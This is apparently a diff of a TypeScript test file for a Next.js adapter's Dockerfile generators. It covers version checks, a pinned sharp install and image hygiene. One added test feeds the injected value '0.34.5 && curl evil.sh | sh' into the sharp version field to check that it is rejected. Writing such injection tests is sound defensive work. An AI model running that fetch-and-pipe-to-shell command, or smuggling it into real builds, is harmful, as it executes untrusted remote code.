@@ -35,9 +35,9 @@ describe("emitted base image is Node >= 24 (inline (?i:) regex support)", () => 
     expect(() =>
       generateDockerfile({ containerStrategy: "shared-image", nodeVersion: "22", buildId: "b" }),
     ).toThrow(/Node 24/);
-    expect(() => generatePoolDockerfile({ poolName: "ssr", nodeVersion: "23", buildId: "b" })).toThrow(
-      /inline regexp modifiers/,
-    );
+    expect(() =>
+      generatePoolDockerfile({ poolName: "ssr", nodeVersion: "23", buildId: "b" }),
+    ).toThrow(/inline regexp modifiers/);
     expect(() => generateRoutingServiceDockerfile({ nodeVersion: "junk", buildId: "b" })).toThrow(
       /Unsupported emitted base image/,
     );
@@ -55,6 +55,33 @@ describe("generateDockerfile", () => {
     expect(result).toContain("COPY --chown=node:node . .");
     expect(result).toContain("NEXT_BUILD_ID=abc123");
     expect(result).toContain('CMD ["node", "pool-server.cjs"]');
+  });
+
+  // N50 (review #30): the shared-image strategy copies the app's whole node_modules, which
+  // holds the BUILD HOST's @img/* platform packages — not linux-x64 — so it needs the same
+  // in-image sharp install escape hatch the pool Dockerfile has. Without it, /_next/image
+  // 503s ("sharp is unavailable") from a shared image built on a non-linux-x64 host.
+  it("emits a pinned in-image sharp install when installSharpVersion is set", () => {
+    const result = generateDockerfile({
+      containerStrategy: "shared-image",
+      buildId: "abc123",
+      installSharpVersion: "0.34.5",
+    });
+    expect(result).toContain("RUN npm install --no-save --no-audit --no-fund sharp@0.34.5");
+    expect(result.indexOf("COPY --chown=node:node . .")).toBeLessThan(
+      result.indexOf("RUN npm install"),
+    );
+    expect(result.indexOf("RUN npm install")).toBeLessThan(result.indexOf("USER node"));
+  });
+
+  it("rejects an unsafe sharp version (Dockerfile RUN injection)", () => {
+    expect(() =>
+      generateDockerfile({
+        containerStrategy: "shared-image",
+        buildId: "abc123",
+        installSharpVersion: "0.34.5 && curl evil.sh | sh",
+      }),
+    ).toThrow(/Unsafe sharp version/);
   });
 
   it("runs as the non-root node user with node-owned app files", () => {
@@ -142,5 +169,35 @@ describe("generateRoutingServiceDockerfile", () => {
     // Cert paths point at the pod's /tmp emptyDir (root FS is read-only).
     expect(result).toContain("TLS_CERT_FILE=/tmp/tls/tls-cert.pem");
     expect(result).toContain("TLS_KEY_FILE=/tmp/tls/tls-key.pem");
+  });
+});
+
+// Survey batch 2 audits (plans/lessons-from-sibling-adapters.md Tier 5 #26/#28):
+// (a) NEXT_ADAPTER_PATH is a BUILD-machine env that activates adapter hooks; carried into the
+//     runtime image it changes Next's request-handling branches (adapter-bun deletes it at boot
+//     for exactly this reason). The emitted Dockerfiles must never bake it in.
+// (b) Four of five official deploy-* templates ship images with no public/ at all (the runner
+//     stage never copies it). Ours copies the whole staged context, which includes public/ —
+//     pin that the context COPY survives refactors.
+describe("emitted Dockerfile hygiene (survey batch 2)", () => {
+  const dockerfiles = () => [
+    generateDockerfile({ containerStrategy: "shared-image", buildId: "abc123" }),
+    generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" }),
+    generateRoutingServiceDockerfile({ buildId: "abc123" }),
+  ];
+
+  it("never bakes NEXT_ADAPTER_PATH into a runtime image", () => {
+    for (const dockerfile of dockerfiles()) {
+      expect(dockerfile).not.toContain("NEXT_ADAPTER_PATH");
+    }
+  });
+
+  it("copies the staged build context (which carries public/) into app images", () => {
+    expect(generateDockerfile({ containerStrategy: "shared-image", buildId: "abc123" })).toMatch(
+      /^COPY --chown=node:node \. \.$/m,
+    );
+    expect(generatePoolDockerfile({ poolName: "ssr", buildId: "abc123" })).toMatch(
+      /^COPY --chown=node:node context\/ \.$/m,
+    );
   });
 });
